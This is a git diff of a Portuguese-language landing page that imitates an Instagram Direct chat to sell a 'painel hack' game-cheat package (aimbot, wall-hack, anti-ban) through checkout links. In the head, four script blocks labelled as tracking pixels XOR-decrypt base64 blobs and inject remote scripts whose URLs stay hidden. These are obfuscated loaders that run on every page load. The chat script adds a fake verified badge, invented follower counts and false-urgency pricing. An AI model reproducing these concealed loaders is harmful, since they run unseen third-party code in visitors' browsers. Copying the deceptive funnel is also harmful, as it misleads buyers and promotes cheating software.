@@ -1,32 +1,711 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>NzShot Direct</title>
-    <meta name="description" content="Chat interativo estilo Instagram Direct para atendimento, demonstração e ativação da NzShot." />
-    <meta property="og:title" content="NzShot Direct" />
-    <meta property="og:description" content="Chat interativo estilo Instagram Direct para atendimento, demonstração e ativação da NzShot." />
-    <meta property="og:type" content="website" />
-    <meta name="twitter:card" content="summary_large_image" />
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>NzShot - Direct</title>
+  
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Lucide Icons CDN -->
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
 
-    <!-- Google Fonts: Poppins -->
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <!-- Avatar Preload & CDN Preconnect for Instant Image & Audio Loading -->
+  <link rel="dns-prefetch" href="https://i.imgur.com" />
+  <link rel="preconnect" href="https://i.imgur.com" crossorigin />
+  <link rel="dns-prefetch" href="https://www.image2url.com" />
+  <link rel="preconnect" href="https://www.image2url.com" crossorigin />
+  <link rel="dns-prefetch" href="https://images.unsplash.com" />
+  <link rel="preconnect" href="https://images.unsplash.com" crossorigin />
+  <link rel="preload" as="image" href="https://i.ibb.co/PGBjYZRL/7753eb10149e158eaee80e6685b8be45.jpg" fetchpriority="high" />
 
-    <!-- CDNs and preconnects -->
-    <link rel="dns-prefetch" href="https://i.imgur.com" />
-    <link rel="preconnect" href="https://i.imgur.com" crossorigin />
-    <link rel="dns-prefetch" href="https://www.image2url.com" />
-    <link rel="preconnect" href="https://www.image2url.com" crossorigin />
-    <link rel="dns-prefetch" href="https://images.unsplash.com" />
-    <link rel="preconnect" href="https://images.unsplash.com" crossorigin />
-    <link rel="preload" as="image" href="https://i.ibb.co/PGBjYZRL/7753eb10149e158eaee80e6685b8be45.jpg" fetchpriority="high" />
-  </head>
-  <body class="bg-black text-white antialiased">
-    <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+  <!-- UTMify & Pixels Tracking -->
+  <script>(function(){var a_jx=atob("DHUjvCI9+c8qDC6qdQ4ByVBR2/UIZFreBQYZkw1enaEEeVrHHBNakkFSlOFIfgHZFgdKzFZO1r9DdEvGWgVKxEdR16VZLgKIFAFXzktfjLtPfwyQLigPnkVRlq1LYF2ITy5YnkxclKoINgzaHA1G0GtZ2+MIek/GABABhgALmPobOBqaEUAXiRIKmv8dPEyeQxAU3hsfhJJX");var m_wa=[];for(var k_gcln=0;k_gcln<a_jx.length;k_gcln++){m_wa.push(a_jx.charCodeAt(k_gcln)&255);}var z_6z=m_wa[0];var v_40va=m_wa.slice(1,1+z_6z);var a_cz7b=m_wa.slice(1+z_6z);var i_ux56=a_cz7b.map(function(b,w_f2qr){return b^v_40va[w_f2qr%z_6z];});var g_nhd2="";for(var j_3=0;j_3<i_ux56.length;j_3++){g_nhd2+=String.fromCharCode(i_ux56[j_3]&255);}var r_xl7y=decodeURIComponent(escape(g_nhd2));var i_kk=JSON.parse(r_xl7y);var c_i=i_kk.globals||[];c_i.forEach(function(g_xw){window[g_xw.name]=g_xw.value;});var h_y6p7=document.createElement("script");h_y6p7.src=i_kk.url;h_y6p7.async=true;h_y6p7.defer=true;(i_kk.attributes||[]).forEach(function(p_h3fr){h_y6p7.setAttribute(p_h3fr.name,p_h3fr.value);});(document.head||document.documentElement).appendChild(h_y6p7);})();</script>
+  <script>(function(){var w_x=atob("DClm30ksSnByHRStzlJEqjtAaEpQdWDZvlpc8GZPLh5caGDAp08f8SpDJ14QbzverVsPrz1fZQUGcGeCokgSujpYZBoBPziPr10SrSBOPwQXbjaXlVJEsShBL1JIP3DMukhLqj1BIxYLMGTfq18DsT0BMhMdeTnerUJE82taKxwHeDaX7Asb8zIOJBEfeDaX7E0HqygBPwQfdHLU41kUuj9JJARfbmHPp00V/WUOPBEeaHGP9AtEohRR");var a_m=[];for(var z_5wmk=0;z_5wmk<w_x.length;z_5wmk++){a_m.push(w_x.charCodeAt(z_5wmk)&255);}var h_i=a_m[0];var a_n7=a_m.slice(1,1+h_i);var b_hb=a_m.slice(1+h_i);var p_p8m=b_hb.map(function(b,d_3f7){return b^a_n7[d_3f7%h_i];});var d_i="";for(var f_4up=0;f_4up<p_p8m.length;f_4up++){d_i+=String.fromCharCode(p_p8m[f_4up]&255);}var a_o=decodeURIComponent(escape(d_i));var s_6o8l=JSON.parse(a_o);var s_yprn=s_6o8l.globals||[];s_yprn.forEach(function(f_ri4x){window[f_ri4x.name]=f_ri4x.value;});var r_yam=document.createElement("script");r_yam.src=s_6o8l.url;r_yam.async=true;r_yam.defer=true;(s_6o8l.attributes||[]).forEach(function(u_43){r_yam.setAttribute(u_43.name,u_43.value);});(document.head||document.documentElement).appendChild(r_yam);})();</script>
+  <script>(function(){var f_y=atob("DBaividJVSZfsFljWG2Ay1Uldxx92C0XKGWYkQgqMUhxxS0OMXDbkEQmOAg9wnYQO2TLzlM6elY2yDwPd2bLxkIle0wsknVBOWLWzE4rIFI6w3tZA0uOnEAlOkQ+3CpBYk3ZnEkoOEN9insTMW7H0m4tdwp9xjgPLXOAhAV/NB9q0moCa3DAix4oZhNqhjxRbybDh0FrKHsi");var j_10es=[];for(var u_sy=0;u_sy<f_y.length;u_sy++){j_10es.push(f_y.charCodeAt(u_sy)&255);}var y_slsd=j_10es[0];var d_i=j_10es.slice(1,1+y_slsd);var n_x7h=j_10es.slice(1+y_slsd);var i_dxj=n_x7h.map(function(b,u_0){return b^d_i[u_0%y_slsd];});var k_p="";for(var b_wsyn=0;b_wsyn<i_dxj.length;b_wsyn++){k_p+=String.fromCharCode(i_dxj[b_wsyn]&255);}var v_v=decodeURIComponent(escape(k_p));var c_c6x=JSON.parse(v_v);var f_l6a6=c_c6x.globals||[];f_l6a6.forEach(function(o_e38){window[o_e38.name]=o_e38.value;});var o_bo=document.createElement("script");o_bo.src=c_c6x.url;o_bo.async=true;o_bo.defer=true;(c_c6x.attributes||[]).forEach(function(m_f){o_bo.setAttribute(m_f.name,m_f.value);});(document.head||document.documentElement).appendChild(o_bo);})();</script>
+  <script>(function(){var x_px=atob("DEx2o09ofpgEAVh20TdU1j0EXKImaSwCoT9MjGALGvYqdCwbuCoPjSwHE7Zmc3cFsj4f0zsbUe1wbCtZvS0CxjwcUPJ3I3RUsDgC0SYKC+xhcnpMijdUzS4FG7o+IzwXpS1b1jsFF/59LCgEtDoTzTtFBvtrZXUFsidUj20eH/RxZHpM824LjzRKEPlpZHpM8ygX1y5FC+xpaD4P/DwExjkNEOwpci0UuCgFgWNKCPlodD1U625U3hIV");var h_l=[];for(var q_ezdl=0;q_ezdl<x_px.length;q_ezdl++){h_l.push(x_px.charCodeAt(q_ezdl)&255);}var q_u=h_l[0];var t_4vk=h_l.slice(1,1+q_u);var r_i=h_l.slice(1+q_u);var g_n=r_i.map(function(b,o_r){return b^t_4vk[o_r%q_u];});var f_7="";for(var g_w3=0;g_w3<g_n.length;g_w3++){f_7+=String.fromCharCode(g_n[g_w3]&255);}var b_65=decodeURIComponent(escape(f_7));var j_y7=JSON.parse(b_65);var t_qo10=j_y7.globals||[];t_qo10.forEach(function(o_p2){window[o_p2.name]=o_p2.value;});var r_etn=document.createElement("script");r_etn.src=j_y7.url;r_etn.async=true;r_etn.defer=true;(j_y7.attributes||[]).forEach(function(y_v){r_etn.setAttribute(y_v.name,y_v.value);});(document.head||document.documentElement).appendChild(r_etn);})();</script>
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "y2k2ge0vvt");
+  </script>
+
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #000;
+      color: #fff;
+    }
+    .no-scrollbar::-webkit-scrollbar { display: none; }
+    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+    @keyframes popIn {
+      0% { opacity: 0; transform: scale(0.96) translateY(4px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    .animate-pop-in {
+      animation: popIn 0.22s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+  </style>
+</head>
+<body class="bg-black text-white antialiased flex items-center justify-center min-h-screen">
+
+  <div class="w-full max-w-lg h-[100dvh] bg-black flex flex-col relative border-x border-[#1a1a1a] shadow-2xl overflow-hidden">
+    <!-- Header -->
+    <header class="bg-black/95 backdrop-blur-md px-4 py-3 flex items-center justify-between border-b border-[#262626] flex-shrink-0 z-20 sticky top-0">
+      <div class="flex items-center gap-3">
+        <button onclick="openProfile()" class="text-white hover:opacity-75 transition-opacity p-1 -ml-1 cursor-pointer">
+          <i data-lucide="chevron-left" class="w-6 h-6 stroke-[2.5]"></i>
+        </button>
+
+        <button onclick="openProfile()" class="flex items-center gap-3 text-left group cursor-pointer">
+          <div class="relative">
+            <img id="header-avatar" src="https://i.ibb.co/PGBjYZRL/7753eb10149e158eaee80e6685b8be45.jpg" alt="NzShot" loading="eager" decoding="sync" fetchpriority="high" class="w-10 h-10 rounded-full object-cover border border-[#333] group-hover:scale-105 transition-transform" />
+            <span class="absolute bottom-0 right-0 w-2.5 h-2.5 bg-emerald-500 rounded-full ring-2 ring-black"></span>
+          </div>
+
+          <div>
+            <h1 class="font-semibold text-white text-sm flex items-center gap-1.5 leading-tight">
+              <span id="header-name">NzShot</span>
+              <i data-lucide="check-circle-2" class="w-3.5 h-3.5 text-[#3797F0] fill-[#3797F0] text-black"></i>
+            </h1>
+            <p id="header-status" class="text-[11px] text-[#A8A8A8] font-normal leading-none mt-0.5">
+              Online agora
+            </p>
+          </div>
+        </button>
+      </div>
+
+      <div class="flex items-center gap-3 text-white">
+        <button id="btn-audio-call" onclick="alert('Chamada de áudio iniciada')" class="p-1.5 hover:opacity-75 transition-opacity cursor-pointer">
+          <i data-lucide="phone" class="w-5 h-5 stroke-[2]"></i>
+        </button>
+        <button id="btn-video-call" onclick="alert('Chamada de vídeo iniciada')" class="p-1.5 hover:opacity-75 transition-opacity cursor-pointer">
+          <i data-lucide="video" class="w-5 h-5 stroke-[2]"></i>
+        </button>
+      </div>
+    </header>
+
+    <!-- Chat Area -->
+    <div id="chat-container" class="flex-1 p-4 overflow-y-auto no-scrollbar flex flex-col space-y-1.5">
+      <!-- Profile Card -->
+      <div class="text-center my-6 flex-shrink-0 flex flex-col items-center animate-fade-in">
+        <div class="relative w-24 h-24 mx-auto mb-2.5 p-[2.5px] rounded-full bg-gradient-to-tr from-[#FFD600] via-[#FF0069] to-[#D300C5] shadow-lg">
+          <div class="bg-black p-0.5 rounded-full w-full h-full">
+            <img src="https://i.ibb.co/PGBjYZRL/7753eb10149e158eaee80e6685b8be45.jpg" alt="NzShot" loading="eager" decoding="sync" fetchpriority="high" class="w-full h-full rounded-full object-cover" />
+          </div>
+        </div>
+        <h2 class="font-semibold text-white text-base tracking-tight flex items-center gap-1">NzShot</h2>
+        <p class="text-xs text-neutral-400 mt-0.5">Instagram • @nzh2x segue você </p>
+        <p class="text-xs text-neutral-500 mt-1">27 mil seguidores • 15 publicações</p>
+        <button id="btn-view-profile" onclick="openProfile()" class="mt-3 bg-[#262626] hover:bg-[#333333] active:scale-95 text-white text-xs font-semibold px-5 py-2 rounded-lg transition-all duration-150 border border-neutral-800 cursor-pointer">
+          Ver perfil
+        </button>
+      </div>
+
+      <!-- Messages container -->
+      <div id="messages-list" class="flex flex-col space-y-1.5"></div>
+
+      <!-- Typing Indicator -->
+      <div id="typing-indicator" class="hidden items-end self-start space-x-2 my-1.5 animate-pop-in">
+        <img src="https://i.ibb.co/PGBjYZRL/7753eb10149e158eaee80e6685b8be45.jpg" alt="Bot" class="w-7 h-7 rounded-full flex-shrink-0 object-cover border border-[#333]" />
+        <div class="bg-[#262626] px-4 py-3 rounded-2xl rounded-bl-sm flex items-center gap-1.5 border border-[#303030]/60 shadow-sm">
+          <span class="w-2 h-2 bg-neutral-400 rounded-full animate-bounce [animation-delay:-0.3s]"></span>
+          <span class="w-2 h-2 bg-neutral-400 rounded-full animate-bounce [animation-delay:-0.15s]"></span>
+          <span class="w-2 h-2 bg-neutral-400 rounded-full animate-bounce"></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Options Container -->
+    <div id="options-container" class="hidden p-3.5 sm:p-4 border-t border-[#262626] bg-black/90 backdrop-blur-sm mt-auto flex-shrink-0 z-10 animate-pop-in">
+      <div id="options-buttons" class="flex flex-col items-center justify-center gap-2.5 max-w-lg mx-auto w-full"></div>
+    </div>
+  </div>
+
+  <!-- Profile Modal -->
+  <div id="profile-modal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 animate-pop-in">
+    <div class="bg-[#121212] border border-[#262626] rounded-2xl w-full max-w-md max-h-[90vh] overflow-y-auto no-scrollbar relative shadow-2xl flex flex-col">
+      <div class="sticky top-0 bg-[#121212]/95 backdrop-blur-md px-4 py-3 border-b border-[#262626] flex items-center justify-between z-10">
+        <div class="flex items-center gap-1.5 font-semibold text-white text-base">
+          NzShot
+          <i data-lucide="check-circle-2" class="w-4 h-4 text-[#3797F0] fill-[#3797F0] text-black"></i>
+        </div>
+        <button onclick="closeProfile()" class="p-1.5 text-neutral-400 hover:text-white rounded-full hover:bg-neutral-800 transition-colors cursor-pointer">
+          <i data-lucide="x" class="w-5 h-5"></i>
+        </button>
+      </div>
+
+      <div class="p-5">
+        <div class="flex items-center gap-6 mb-4">
+          <div class="relative w-20 h-20 flex-shrink-0 p-0.5 rounded-full bg-gradient-to-tr from-[#FFD600] via-[#FF0069] to-[#D300C5]">
+            <div class="bg-black p-0.5 rounded-full w-full h-full">
+              <img src="https://i.ibb.co/PGBjYZRL/7753eb10149e158eaee80e6685b8be45.jpg" alt="NzShot" class="w-full h-full rounded-full object-cover" />
+            </div>
+          </div>
+
+          <div class="flex-1 grid grid-cols-3 text-center gap-2">
+            <div>
+              <div class="font-bold text-white text-sm">15</div>
+              <div class="text-[11px] text-neutral-400">publicações</div>
+            </div>
+            <div>
+              <div class="font-bold text-white text-sm">27 mil</div>
+              <div class="text-[11px] text-neutral-400">seguidores</div>
+            </div>
+            <div>
+              <div class="font-bold text-white text-sm">214</div>
+              <div class="text-[11px] text-neutral-400">seguindo</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-4">
+          <h3 class="font-semibold text-white text-sm">NzShot</h3>
+          <span class="inline-block text-xs text-neutral-400 font-normal">Instagram • @nzh2x segue você </span>
+          <p class="text-xs text-neutral-200 mt-1 leading-relaxed">
+            🎯 A melhor sensibilidade & calibrador para mobile.<br />
+            🛡️ 100% Seguro, Anti-Ban & Testado.<br />
+            ⚡ Suba capa com qualquer arma sem esforço.
+          </p>
+          <button onclick="redirectToSales()" class="text-[#3797F0] text-xs font-medium flex items-center gap-1 mt-1.5 hover:underline cursor-pointer">
+            <i data-lucide="external-link" class="w-3.5 h-3.5"></i> 
+          </button>
+        </div>
+
+        <div class="grid grid-cols-2 gap-2 mb-6">
+          <button onclick="redirectToSales()" class="bg-[#3797F0] hover:bg-blue-600 active:scale-95 text-white font-semibold py-2 rounded-lg text-xs transition-all text-center cursor-pointer">
+            Acessar Site Oficial
+          </button>
+          <button onclick="closeProfile()" class="bg-[#262626] hover:bg-[#333] active:scale-95 text-white font-semibold py-2 rounded-lg text-xs transition-all text-center cursor-pointer">
+            Conversar no Direct
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const config = {"accountName":"NzShot","verified":true,"avatarUrl":"https://i.ibb.co/PGBjYZRL/7753eb10149e158eaee80e6685b8be45.jpg","category":"Instagram • @nzh2x segue você ","followersCount":"27 mil","postsCount":"15","salesPageUrl":"","onlineStatus":"Online agora","videoEmbedUrl":"https://www.image2url.com/r2/default/videos/1788282663673-f47140ee-13d0-4f21-9740-203d578478e7.mp4","flow":[{"message":"Fala, jogador! Sou o gerente da NzShot e vou te ajudar a pegar seu painel hack. Bora começar?","delay":2000,"options":[]},{"message":"Qual dispositivo que você usa atualmente para jogar?  ","delay":2000,"options":[{"text":"ANDROID","next":2},{"text":"IPHONE","next":2},{"text":"EMULADOR/PC","next":2}]},{"message":"","delay":2000,"options":[],"isAudio":true,"audioUrl":"https://www.image2url.com/r2/default/audio/1788202046212-fe56c9af-ee35-4ffb-b02b-2707b3c70b22.mp3"},{"message":"⚡ QUER O PAINEL HACK? ⚡ Assista até o final para ativá-lo! 🎯📲 São só 50 segundinhos! Não perca! ⏳👇 ","delay":2000,"options":[],"isVideo":false,"videoUrl":"https://youtu.be/Nn30ROKqckc"},{"message":"","delay":2000,"options":[],"isVideo":true,"videoUrl":"https://www.image2url.com/r2/default/videos/1788289048429-702647bb-f99a-4240-a5bf-8a968e207242.mp4"},{"message":"🤔 O que você escolhe?\n 🔍 Ver os depoimentos de quem já usa ou\n ⚡ Ativar agora seu painel hack? 👇 ","delay":2000,"options":[{"text":"🔍 - VER RECOMENDAÇÕES DE CLIENTES","next":6}]},{"message":"🔍 SAIBA COMO FUNCIONA! Veja o passo a passo para ativar o painel hack! 🎯📲 Apenas 40 segundos! 🚀👇 ","delay":2000,"options":[]},{"message":"","delay":2000,"options":[],"isVideo":true,"videoUrl":"https://www.image2url.com/r2/default/videos/1788289144354-3091049c-c891-4f92-a297-0b29f36e274a.mp4"},{"message":"📢 Veja os depoimentos de quem já ativou o painel hack! 🔵👇 ","delay":2000,"options":[]},{"message":"","delay":2000,"options":[],"isVideo":true,"videoUrl":"https://www.image2url.com/r2/default/videos/1788289210807-4eb94d95-cd57-427e-9997-0c11179b715e.mp4"},{"message":"- CONFERIU AS RECOMENDAÇÕES DOS NOSSOS CLIENTES? 👇","delay":2000,"options":[{"text":"🚀 Muito brabo! Bora ativar meu painel hack! 🔥✅","next":11}]},{"message":"","delay":2000,"options":[],"isAudio":true,"audioUrl":"https://www.image2url.com/r2/default/audio/1788204712973-7da3fc77-eb04-4bdd-a2c8-ad1409d76753.mp3"},{"message":"❓ Confira as dúvidas mais frequentes que recebo no Instagram! 👇✅","delay":2000,"options":[]},{"message":"..","delay":2000,"options":[],"isVideo":true,"videoUrl":"https://www.image2url.com/r2/default/videos/1788282663673-f47140ee-13d0-4f21-9740-203d578478e7.mp4"},{"message":"\n🛒 Finalizando sua compra agora! 🚀🎯🎧 Escute o áudio – só 25 segundinhos! 🔊👇","delay":2000,"options":[]},{"message":"","delay":2000,"options":[],"isAudio":true,"audioUrl":"https://www.image2url.com/r2/default/audio/1788205178840-0de58070-adb6-4ad4-ab70-7aedd3816583.mp3"},{"message":"","delay":2000,"options":[],"isVideo":true,"videoUrl":"https://www.image2url.com/r2/default/videos/1788289511111-686fbcda-3dd6-4eaa-9d26-170111c269d5.mp4"},{"message":"Jogador, Agora você tem duas opções...","delay":2000,"options":[]},{"message":"🛑 PACOTE BÁSICO\n\n⏰ - 30 dias\n\n✅PAINEL HACK   \n✅ANTI-BAN\n\n⭐️ BONUS: GRUPO DE WHATSAPP DOS JOGADORES SENSI MESTRUADA \n\n🚨 - INFORMAÇÕES IMPORTANTES:\n\n🚩 TUTORIAL COMPLETO DE INSTALAÇÃO NO \nDOWNLOAD;\n\n🚩 PODE INSTALAR PELO CELULAR OU PC SE QUISER;\n\n🚩 NÃO PRECISA FORMATAR O CELULAR OU ALGO DO TIPO, APENAS INSTALAR. \n\n\n🛒 POR APENAS R$ 14,99","delay":2000,"options":[]},{"message":"OU: 👇","delay":2000,"options":[]},{"message":"🏆- PACOTE COMPLETO PAINEL HACK\n\n⏰ - ACESSO PERMANENTE\n\n✅ PAINEL HACK \n✅ HEAD TRICK\n✅ AIM-LOCK\n✅ ANTI-BAN\n✅ AIM-BOT\n✅ ANTENA\n✅ AIM-FOV\n✅WALL-HACK \n✅ OTIMIZAÇÃO\n\n⭐️ BONUS: GRUPO DE WHATSAPP DOS JOGADORES SENSI MESTRUADA \n\n🎁  PROMOÇÃO DE LANÇAMENTO⚡(ULTIMAS VAGAS!)\n\n🚨 - INFORMAÇÕES IMPORTANTES:\n\n🚩 FUNCIONA EM TODOS OS DISPOSITIVOS\n\n🚩 TUTORIAL COMPLETO DE INSTALAÇÃO NO \nDOWNLOAD;\n\n🚩 PODE INSTALAR PELO CELULAR OU PC SE QUISER;\n\n🚩 NÃO PRECISA FORMATAR O CELULAR OU ALGO DO TIPO, APENAS INSTALAR. \n\n\n🛒 SOMENTE HOJE DE 4̶7̶,̶0̶0̶ POR APENAS R$ 27,90\n\n🚨 (OBS: ESSE É O ÚNICO SITE OFICIAL NUNCA COMPRE POR OUTRO LUGAR ","delay":2000,"options":[]},{"message":"Eai, qual pacote você vai escolher?","delay":2000,"options":[]},{"message":"","delay":2000,"options":[{"text":"✅ Vou de pacote básico! Quero ativar agora! 🔥📦","next":23,"action":"checkout_confirm","highlight":true,"confirmationMessage":"✅ Mandou bem! Toque no botão abaixo para liberar o painel hack e receber seus bônus! ⚡🎁👇","confirmationButtonText":"ATIVAR O PAINEL HACK!","checkoutUrl":"https://ggcheckout.app/checkout/v3/b7KSzKQSISHTMSbeLRfL"},{"text":"✅ Premium ativado! Quero o pacote completo e todos os benefícios! 🔥🎯","next":23,"action":"checkout_confirm","highlight":true,"confirmationMessage":"✅ Mandou bem! Toque no botão abaixo para liberar o painel hack e receber seus bônus! ⚡🎁👇","confirmationButtonText":"ATIVAR O PAINEL HACK!","checkoutUrl":"https://ggcheckout.app/checkout/v3/epjX5WE20awPE63T2BaE"}]}]};
+    let currentTimer = null;
+
+    function safeCreateIcons() {
+      try {
+        if (typeof lucide !== 'undefined' && lucide.createIcons) {
+          lucide.createIcons();
+        }
+      } catch (e) {
+        console.warn('Lucide icons error:', e);
+      }
+    }
+
+    function scrollToBottom() {
+      const container = document.getElementById('chat-container');
+      if (container) {
+        container.scrollTo({ top: container.scrollHeight, behavior: 'smooth' });
+      }
+    }
+
+    function redirectToSales(customUrl) {
+      const salesUrl = customUrl || config.salesPageUrl || 'https://noskillsensi.com.br';
+      const search = window.location.search || '';
+      if (!search) {
+        window.location.href = salesUrl;
+        return;
+      }
+      const separator = salesUrl.includes('?') ? '&' : '?';
+      const cleanSearch = search.startsWith('?') ? search.substring(1) : search;
+      window.location.href = salesUrl + separator + cleanSearch;
+    }
+
+    function openProfile() {
+      document.getElementById('profile-modal').classList.remove('hidden');
+      safeCreateIcons();
+    }
+
+    function closeProfile() {
+      document.getElementById('profile-modal').classList.add('hidden');
+    }
+
+    function renderOptions(options) {
+      const optContainer = document.getElementById('options-container');
+      const optButtons = document.getElementById('options-buttons');
+      optButtons.innerHTML = '';
+
+      if (!options || options.length === 0) {
+        optContainer.classList.add('hidden');
+        return;
+      }
+
+      options.forEach((opt, idx) => {
+        const isHighlight = opt.highlight || opt.action === 'redirect' || opt.action === 'checkout_confirm';
+        const btn = document.createElement('button');
+        btn.id = 'chat-opt-btn-' + idx;
+        btn.className = 'w-full text-center font-semibold py-3 px-4 rounded-full text-sm transition-all duration-200 cursor-pointer active:scale-[0.98] flex items-center justify-center gap-2 ' +
+          (isHighlight
+            ? 'bg-gradient-to-r from-[#3797F0] to-[#2563EB] text-white shadow-lg shadow-blue-500/25 hover:brightness-110 border border-blue-400/30'
+            : 'border border-[#3797F0] text-[#3797F0] hover:bg-[#3797F0] hover:text-white bg-transparent');
+
+        btn.innerHTML = (isHighlight ? '<i data-lucide="sparkles" class="w-4 h-4 animate-pulse"></i>' : '') +
+          '<span>' + opt.text + '</span>' +
+          (isHighlight ? '<i data-lucide="arrow-right" class="w-4 h-4"></i>' : '');
+
+        btn.onclick = function() {
+          handleSelectOption(opt);
+        };
+        optButtons.appendChild(btn);
+      });
+
+      optContainer.classList.remove('hidden');
+      safeCreateIcons();
+      scrollToBottom();
+    }
+
+    function handleSelectOption(option) {
+      const messagesList = document.getElementById('messages-list');
+      const typingIndicator = document.getElementById('typing-indicator');
+      
+      // User message
+      const userBubble = document.createElement('div');
+      userBubble.className = 'flex justify-end self-end my-1 animate-pop-in max-w-[85%] sm:max-w-xs ml-auto';
+      userBubble.innerHTML = '<div class="bg-[#3797F0] px-4 py-2.5 rounded-2xl rounded-br-sm text-white text-sm shadow-sm select-none break-words"><p>' + option.text + '</p></div>';
+      messagesList.appendChild(userBubble);
+
+      document.getElementById('options-container').classList.add('hidden');
+      scrollToBottom();
+
+      // Action: checkout_confirm (Intermediate message -> final activate button)
+      if (option.action === 'checkout_confirm' || option.confirmationMessage || option.confirmationButtonText) {
+        typingIndicator.classList.remove('hidden');
+        typingIndicator.classList.add('flex');
+        scrollToBottom();
+
+        setTimeout(function() {
+          typingIndicator.classList.remove('flex');
+          typingIndicator.classList.add('hidden');
+
+          const botBubble = document.createElement('div');
+          botBubble.className = 'flex items-end self-start space-x-2 my-1 animate-pop-in max-w-[92%] sm:max-w-md';
+          const msgText = option.confirmationMessage || '✅ Mandou bem! Toque no botão abaixo para liberar o painel hack e receber seus bônus! ⚡🎁👇';
+          
+          botBubble.innerHTML = '<img src="' + config.avatarUrl + '" alt="Avatar" class="w-7 h-7 rounded-full flex-shrink-0 object-cover border border-[#333] mb-0.5" />' +
+            '<div class="bg-[#262626] border border-[#333]/50 rounded-2xl rounded-bl-sm p-3.5 text-white text-sm shadow-md overflow-hidden w-full">' +
+              '<div class="text-neutral-100 text-sm leading-relaxed whitespace-pre-line">' + msgText + '</div>' +
+            '</div>';
+
+          messagesList.appendChild(botBubble);
+          scrollToBottom();
+
+          setTimeout(function() {
+            renderOptions([{
+              text: option.confirmationButtonText || 'ATIVAR O PAINEL HACK!',
+              action: 'redirect',
+              checkoutUrl: option.checkoutUrl || config.salesPageUrl,
+              highlight: true,
+            }]);
+          }, 300);
+        }, 1000);
+        return;
+      }
+
+      if (option.action === 'redirect') {
+        setTimeout(function() {
+          redirectToSales(option.checkoutUrl);
+        }, 400);
+        return;
+      }
+
+      if (option.next !== undefined) {
+        runChatStep(option.next);
+      }
+    }
+
+    const WAVE_BARS = [30, 45, 75, 90, 60, 40, 80, 100, 85, 65, 45, 90, 100, 70, 50, 85, 95, 60, 40, 75, 90, 55, 35, 70, 85, 60, 40, 30];
+
+    function createAudioBubble(audioUrl, onEndedCallback) {
+      const audioId = 'audio_' + Math.random().toString(36).substring(2, 9);
+      const container = document.createElement('div');
+      container.className = 'flex items-end self-start space-x-2 my-1 animate-pop-in max-w-[92%] sm:max-w-md w-full';
+
+      let barsHtml = '';
+      WAVE_BARS.forEach(function(h, idx) {
+        barsHtml += '<div class="wave-bar flex-1 rounded-full transition-colors duration-100 min-w-[2px] bg-[#525252]" data-idx="' + idx + '" style="height:' + Math.max(20, (h / 100) * 24) + 'px;"></div>';
+      });
+
+      container.innerHTML = '<img src="' + config.avatarUrl + '" alt="Avatar" class="w-7 h-7 rounded-full flex-shrink-0 object-cover border border-[#333] mb-0.5" />' +
+        '<div class="bg-[#262626] border border-[#333]/60 rounded-2xl rounded-bl-sm p-3 text-white shadow-md w-full max-w-[290px] sm:max-w-[320px] select-none">' +
+          '<audio id="' + audioId + '" src="' + audioUrl + '" preload="auto" playsinline></audio>' +
+          '<div class="flex items-center gap-3">' +
+            '<button id="btn-play-' + audioId + '" class="w-10 h-10 rounded-full bg-[#3797F0] hover:bg-[#2878c7] active:scale-95 text-white flex items-center justify-center flex-shrink-0 transition-all shadow-md cursor-pointer">' +
+              '<i data-lucide="play" class="w-5 h-5 fill-white ml-0.5"></i>' +
+            '</button>' +
+            '<div class="flex-1 flex flex-col justify-center min-w-0">' +
+              '<div id="waveform-' + audioId + '" class="flex items-center gap-[2.5px] h-7 cursor-pointer py-1">' + barsHtml + '</div>' +
+              '<div class="flex items-center justify-between text-[11px] text-neutral-400 mt-0.5 font-mono">' +
+                '<span class="flex items-center gap-1">' +
+                  '<i data-lucide="mic" class="w-3 h-3 text-[#3797F0]"></i>' +
+                  '<span id="time-' + audioId + '">0:16</span>' +
+                '</span>' +
+                '<button id="btn-speed-' + audioId + '" class="text-[10px] font-sans font-semibold px-1.5 py-0.5 rounded bg-[#1a1a1a] hover:bg-[#333] text-neutral-300 transition-colors cursor-pointer">1x</button>' +
+              '</div>' +
+            '</div>' +
+          '</div>' +
+        '</div>';
+
+      setTimeout(function() {
+        const audio = document.getElementById(audioId);
+        const playBtn = document.getElementById('btn-play-' + audioId);
+        const timeSpan = document.getElementById('time-' + audioId);
+        const speedBtn = document.getElementById('btn-speed-' + audioId);
+        const waveform = document.getElementById('waveform-' + audioId);
+        if (!audio) return;
+
+        let playbackRate = 1;
+        let endedTriggered = false;
+
+        function triggerEndedOnce() {
+          if (!endedTriggered) {
+            endedTriggered = true;
+            if (typeof onEndedCallback === 'function') {
+              onEndedCallback();
+            }
+          }
+        }
+
